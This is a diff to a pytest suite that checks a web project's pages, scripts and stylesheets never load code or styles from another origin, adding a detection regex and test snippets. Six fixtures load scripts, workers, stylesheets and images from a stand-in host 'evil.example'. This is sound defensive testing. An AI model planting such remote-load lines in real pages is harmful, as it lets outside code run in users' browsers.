@@ -26,13 +26,35 @@ PINNED = {
 }
 
 
+# A foreign load in code: an assigned .src, a dynamic import(), a worker or
+# importScripts() target, or a CSS @import / url() pointing off-origin.
+_FOREIGN_CODE = re.compile(
+    r"""(?:\.src\s*=|import\(|importScripts\(|new\s+(?:Shared)?Worker\(|@import|url\()"""
+    r"""\s*['"`]?(?:https?:)?//"""
+)
+
+
 class _Loads(HTMLParser):
     def __init__(self):
         super().__init__()
         self.urls = []
+        self.inline = []
+        self._in_code = False
+
+    def handle_data(self, data):
+        if self._in_code:
+            self.inline.append(data)
+
+    def handle_endtag(self, tag):
+        if tag in {"script", "style"}:
+            self._in_code = False
 
     def handle_starttag(self, tag, attrs):
         attrs = dict(attrs)
+        if tag in {"script", "style"}:
+            self._in_code = True
+        if tag == "link" and attrs.get("href") and "preload" in (attrs.get("rel") or ""):
+            self.urls.append(attrs["href"])
         if tag == "script" and attrs.get("src"):
             self.urls.append(attrs["src"])
         if tag == "link" and attrs.get("href") and "stylesheet" in (attrs.get("rel") or ""):
@@ -47,17 +69,38 @@ def test_a_page_loads_nothing_from_another_origin(page):
     parser.feed(page.read_text(encoding="utf-8"))
     foreign = [u for u in parser.urls if re.match(r"^(https?:)?//", u)]
     assert not foreign, f"{page.name} loads {foreign}"
+    assert not any(_FOREIGN_CODE.search(code) for code in parser.inline), (
+        f"{page.name} has an inline script or style that loads from another origin"
+    )
 
 
-def test_scripts_never_load_code_from_another_origin():
+def test_scripts_and_styles_never_load_from_another_origin():
     """Dynamic loads too (analytics injects Chart.js with s.src = ...)."""
-    pattern = re.compile(r"""(?:\.src\s*=|import\(|importScripts\()\s*['"`](?:https?:)?//""")
+    sources = [*sorted((WEB / "js").rglob("*.js")), *sorted((WEB / "css").rglob("*.css"))]
     offenders = [
         str(path.relative_to(WEB))
-        for path in sorted((WEB / "js").rglob("*.js"))
-        if VENDOR not in path.parents and pattern.search(path.read_text(encoding="utf-8"))
+        for path in sources
+        if VENDOR not in path.parents and _FOREIGN_CODE.search(path.read_text(encoding="utf-8"))
     ]
     assert not offenders
+
+
+@pytest.mark.parametrize(
+    "snippet",
+    [
+        "<script>import('https://evil.example/x.js')</script>",
+        "<script>const s = document.createElement('script'); s.src = '//evil.example/x.js'</script>",
+        "<style>@import url('https://evil.example/x.css');</style>",
+        "<style>body { background: url(https://evil.example/p.png) }</style>",
+        '<link rel="modulepreload" href="https://evil.example/m.js">',
+        "<script>new Worker('https://evil.example/w.js')</script>",
+    ],
+)
+def test_the_guard_sees_every_foreign_load_shape(snippet):
+    parser = _Loads()
+    parser.feed(snippet)
+    foreign = [u for u in parser.urls if re.match(r"^(https?:)?//", u)]
+    assert foreign or any(_FOREIGN_CODE.search(code) for code in parser.inline)
 
 
 def test_every_vendored_file_is_pinned_and_licensed():
